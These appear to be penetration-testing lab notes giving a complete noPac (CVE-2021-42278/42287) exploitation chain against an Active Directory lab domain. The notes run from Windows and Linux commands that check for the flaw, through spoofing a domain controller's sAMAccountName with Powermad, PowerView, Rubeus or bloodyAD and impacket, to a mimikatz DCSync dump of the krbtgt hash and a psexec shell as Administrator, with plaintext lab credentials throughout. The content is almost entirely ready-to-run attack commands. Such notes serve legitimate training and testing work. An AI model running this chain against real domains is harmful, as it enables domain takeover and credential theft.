
> **Enumerate Vulnerability (NoPAC Check)**

```c
# From Windows (noPac tool)
.\noPac.exe scan -domain inlanefreight.local -user aneudy -pass Ilovemusic01
# Expected: Ticket size < 1000 → likely vulnerable

# From Linux (scanner)
python3 scanner.py -dc-ip 10.129.229.224 inlanefreight.local/aneudy:Ilovemusic01 -use-ldap
```

> **Check Machine Account Quota (MAQ)**

```c
# From PowerView
(Get-DomainObject -SearchScope Base)."ms-ds-machineaccountquota"
```

> **Check How Many Machines aneudy Created**

```c
# PowerView Enumeration
$computers = Get-DomainComputer -Filter '(ms-DS-CreatorSID=*)' -Properties name,ms-ds-creatorsid
$aneudyComputers = $computers | where { 
  (New-Object System.Security.Principal.SecurityIdentifier($_."ms-ds-creatorsid",0)).Value -eq (ConvertTo-SID aneudy) 
}
$aneudyComputers.Count
```

> **Exploit from Windows using PowerMad + PowerView**

```c
# 1. Create Machine Account
Import-Module .\Powermad.ps1
$password = ConvertTo-SecureString 'Password123' -AsPlainText -Force
New-MachineAccount -MachineAccount "TEST01" -Password $($password) -Domain inlanefreight.local -DomainController 172.18.88.10 -Verbose

# 2. Clear SPNs
Import-Module .\PowerView.ps1
Set-DomainObject -Identity 'TEST01$' -Clear 'serviceprincipalname' -Domain inlanefreight.local -DomainController 172.18.88.10

# 3. Rename sAMAccountName to DC03 (spoof)
Set-MachineAccountAttribute -MachineAccount "TEST01" -Value "DC03" -Attribute samaccountname -Domain inlanefreight.local -DomainController 172.18.88.10

# 4. Request TGT as DC03
.\Rubeus.exe asktgt /user:dc03 /password:"Password123" /domain:inlanefreight.local /dc:172.18.88.10 /nowrap

# 5. Rename back to TEST01
Set-MachineAccountAttribute -MachineAccount "TEST01" -Value "TEST01" -Attribute samaccountname -Domain inlanefreight.local -DomainController 172.18.88.10

# 6. Request S4U2Self ticket as Administrator
.\Rubeus.exe s4u /self /impersonateuser:Administrator /altservice:"ldap/dc03.inlanefreight.local" /dc:172.18.88.10 /ptt /ticket:<base64.kirbi>
```

> **Perform DCSync Attack**

```c
# Dump krbtgt hash using mimikatz
.\mimikatz.exe "lsadump::dcsync /domain:inlanefreight.local /kdc:dc03.inlanefreight.local /user:krbtgt" exit
```

> **Exploit from Linux (Using bloodyAD)**

```c
# 1. Check Felipe's SPN
python3 bloodyAD.py -d inlanefreight.local -u aneudy -p Ilovemusic01 --host 10.129.229.224 get object felipe | grep "sAMAccountName\|servicePrincipalName"

# 2. Clear SPN
python3 bloodyAD.py -d inlanefreight.local -u aneudy -p Ilovemusic01 --host 10.129.229.224 set object felipe servicePrincipalName

# 3. Spoof sAMAccountName to DC03
python3 bloodyAD.py -d inlanefreight.local -u aneudy -p Ilovemusic01 --host 10.129.229.224 set object felipe sAMAccountName -v DC03

# 4. Request TGT as DC03 (using Felipe’s creds)
getTGT.py inlanefreight.local/dc03:Hacker0039 -dc-ip 10.129.229.224

# 5. Revert Felipe’s sAMAccountName
python3 bloodyAD.py -d inlanefreight.local -u aneudy -p Ilovemusic01 --host 10.129.229.224 set object DC03 sAMAccountName -v felipe

# 6. S4U2self impersonate Administrator (requires TGT cache)
KRB5CCNAME=dc03.ccache getST.py inlanefreight.local/dc03 -self -impersonate 'Administrator' -altservice 'cifs/dc03.inlanefreight.local' -k -no-pass -dc-ip 10.129.229.224

# 7. Gain shell using psexec and ticket
KRB5CCNAME=Administrator@cifs_dc03.inlanefreight.local@INLANEFREIGHT.LOCAL.ccache psexec.py dc03.inlanefreight.local -k -no-pass

```